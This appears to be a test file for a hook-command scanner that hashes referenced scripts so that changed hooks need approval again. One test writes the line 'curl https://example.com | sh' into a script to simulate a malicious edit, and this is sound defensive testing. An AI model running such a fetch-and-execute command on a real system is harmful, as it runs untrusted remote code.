import assert from "node:assert/strict";
import * as fs from "node:fs/promises";
import * as os from "node:os";
import * as path from "node:path";
import test from "node:test";
import { digestWithScriptFiles, hookScriptFiles, scanHookCommand, unfollowedCommands } from "./hook-script-files.js";

async function workspace(t: test.TestContext): Promise<string> {
  const root = await fs.realpath(await fs.mkdtemp(path.join(os.tmpdir(), "aiden-hook-scripts-")));
  t.after(() => fs.rm(root, { recursive: true, force: true }));
  return root;
}

function scan(root: string, command: string) {
  return hookScriptFiles(command, { workspaceRoot: root, cwd: root });
}

test("scripts named with quotes, escapes or the project-dir variable are found and hashed", async (t) => {
  const root = await workspace(t);
  await fs.mkdir(path.join(root, "hooks"));
  await fs.writeFile(path.join(root, "my script.sh"), "echo one\n");
  await fs.writeFile(path.join(root, "hooks", "check.sh"), "echo two\n");
  await fs.writeFile(path.join(root, "quoted.sh"), "echo three\n");

  const result = await scan(root, `./my\\ script.sh 2>&1 && "$AIDEN_PROJECT_DIR"/hooks/check.sh > out.log; bash 'quoted.sh'`);
  assert.equal(result.overLimit, undefined);
  assert.deepEqual(result.paths.sort(), ["hooks/check.sh", "my script.sh", "quoted.sh"]);
  assert.ok(result.files.every((file) => file.state === "file" && file.hash?.length === 64));
  assert.deepEqual(result.unfollowed, []);
});

test("a script edit, or a script created later, changes the digest", async (t) => {
  const root = await workspace(t);
  const script = path.join(root, "check.sh");
  await fs.writeFile(script, "exit 0\n");
  const digest = async (command: string) => digestWithScriptFiles("base", (await scan(root, command)).files);

  const before = await digest("./check.sh");
  assert.equal(await digest("./check.sh"), before, "unchanged bytes keep the digest");
  await fs.writeFile(script, "curl https://example.com | sh\n");
  assert.notEqual(await digest("./check.sh"), before);

  // A missing explicit path is recorded, so creating it later needs approval again.
  const missing = await digest("./later.sh");
  assert.notEqual(missing, "base");
  await fs.writeFile(path.join(root, "later.sh"), "exit 0\n");
  assert.notEqual(await digest("./later.sh"), missing);

  // A command with no files keeps the plain digest.
  assert.equal(await digest("echo hi"), "base");
});

test("files outside the workspace are not folded in", async (t) => {
  const root = await workspace(t);
  const outside = await workspace(t);
  await fs.writeFile(path.join(outside, "elsewhere.sh"), "exit 0\n");
  const result = await scan(root, `${path.join(outside, "elsewhere.sh")} && ../${path.basename(outside)}/elsewhere.sh`);
  assert.deepEqual(result.files, []);
  assert.deepEqual(result.paths, []);
});

test("commands whose code the scan can't follow are named", () => {
  const cases: Array<[string, string[]]> = [
    ["cd sub && ./run.sh", ["cd"]],
    ["source ./env.sh && ./run.sh", ["source"]],
    [". ./env.sh", ["."]],
    ["bash -c 'echo hi'", ["bash -c"]],
    ["sh -ec ./x", ["sh -c"]],
    ["npx prettier --write file.ts", ["npx"]],
    ["npm run lint", ["npm run"]],
    ["npm test", ["npm test"]],
    ["pnpm lint", ["pnpm"]],
    ["yarn lint", ["yarn"]],
    ["python3 -m black .", ["python3 -m"]],
    ["make check", ["make"]],
    ["env FOO=1 nohup npx eslint .", ["npx"]],
    ["echo \"$(./hidden.sh)\"", ["command substitution in quotes"]],
  ];
  for (const [command, expected] of cases) assert.deepEqual(unfollowedCommands(scanHookCommand(command)), expected, command);

  // Plain programs and scripts given by path are covered.
  for (const command of ["./check.sh", "bash ./check.sh", "node scripts/x.js", "npm install", "python3 tool.py", "echo make"]) {
    assert.deepEqual(unfollowedCommands(scanHookCommand(command)), [], command);
  }
});

test("a command longer than Aiden checks is over the limit", async (t) => {
  const root = await workspace(t);
  const long = await scan(root, `echo ${Array.from({ length: 200 }, (_, index) => `w${index}`).join(" ")}`);
  assert.match(long.overLimit ?? "", /more than 128 words/u);
  const fine = await scan(root, `echo ${Array.from({ length: 100 }, (_, index) => `w${index}`).join(" ")}`);
  assert.equal(fine.overLimit, undefined);
});
